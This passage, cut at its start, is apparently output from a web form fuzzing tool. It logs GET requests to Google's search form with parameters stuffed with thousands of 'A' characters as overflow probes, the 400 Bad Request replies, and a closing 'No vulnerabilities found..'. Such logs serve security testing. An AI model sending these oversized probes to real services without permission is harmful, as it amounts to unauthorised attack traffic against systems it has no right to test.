AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:51 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:51 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] Done with this form!
[1.0] Done with this document!

No vulnerabilities found..
